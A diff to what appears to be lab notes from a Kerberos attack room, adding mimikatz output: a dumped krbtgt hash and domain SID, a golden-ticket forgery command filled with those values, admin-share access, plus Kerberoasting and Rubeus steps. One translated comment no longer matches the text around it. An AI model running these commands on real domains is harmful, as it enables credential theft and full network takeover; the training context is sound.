@@ -65,7 +65,7 @@ La herramienta tiene demasiados ataques y funciones como para cubrirlos todos, a
 
 
 
-echo 10.201.83.173 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+echo 10.201.3.6 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 
 Rubeus.exe harvest /interval:30
 
@@ -273,12 +273,12 @@ sudo unzip impacket-impacket_0_9_19.zip -d /opt
 
 1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
 
-2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.83.173 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.3.6 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
 
 3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
 
 
-sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.83.173 -request
+sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.3.6 -request
 
 
 
@@ -1059,7 +1059,7 @@ Action: Dump Kerberos Ticket Data (All Users)
 
 # Golden/Silver Ticket Attacks w/ mimikatz
 
-# Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.
+# Mimikatz es una herramienta de posexplotación muy popular y poderosa que se usa más comúnmente para volcar credenciales de usuario dentro de una red de directorio activo; sin embargo, usaremos mimikatz para volcar un TGT desde la memoria LSASS
 
 A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
 
@@ -1081,22 +1081,104 @@ Dump the krbtgt hash -
 
 2.) privilege::debug - ensure this outputs [privilege '20' ok]
 
-﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+﻿3.) lsadump::lsa /inject /name:krbtgt 
+- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+
+
+
+
+mimikatz # lsadump::lsa /inject /name:krbtgt
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6
+    LM   :
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
+
+ * WDigest
+    01  d2e9aa3caa4509c3f11521c70539e4ad
+    02  c9a868fc195308b03d72daa4a5a4ee47
+    03  171e066e448391c934d0681986f09ff4
+    04  d2e9aa3caa4509c3f11521c70539e4ad
+    05  c9a868fc195308b03d72daa4a5a4ee47
+    06  41903264777c4392345816b7ecbf0885
+    07  d2e9aa3caa4509c3f11521c70539e4ad
+    08  9a01474aa116953e6db452bb5cd7dc49
+    09  a8e9a6a41c9a6bf658094206b51a4ead
+    10  8720ff9de506f647ad30f6967b8fe61e
+    11  841061e45fdc428e3f10f69ec46a9c6d
+    12  a8e9a6a41c9a6bf658094206b51a4ead
+    13  89d0db1c4f5d63ef4bacca5369f79a55
+    14  841061e45fdc428e3f10f69ec46a9c6d
+    15  a02ffdef87fc2a3969554c3f5465042a
+    16  4ce3ef8eb619a101919eee6cc0f22060
+    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
+    18  085f371533fc3860fdbf0c44148ae730
+    19  265525114c2c3581340ddb00e018683b
+    20  f5708f35889eee51a5fa0fb4ef337a9b
+
+
+
+
+
+
+
+
+
+
 
 
 
 Create a Golden/Silver Ticket - 
 
-﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
+
+
+- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 
 I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.
 
 
 
+
+
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 1103
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 8/6/2025 2:50:54 PM ; 8/4/2035 2:50:54 PM ; 8/4/2035 2:50:54 PM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz #
+
+
+
+
+
 Use the Golden/Silver Ticket to access other machines -
 
-﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
+﻿1.) misc::cmd 
 
+      - this will open a new elevated command prompt with the given ticket in mimikatz.
+
+dir \\10.201.3.6\admin$
 
 
 2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
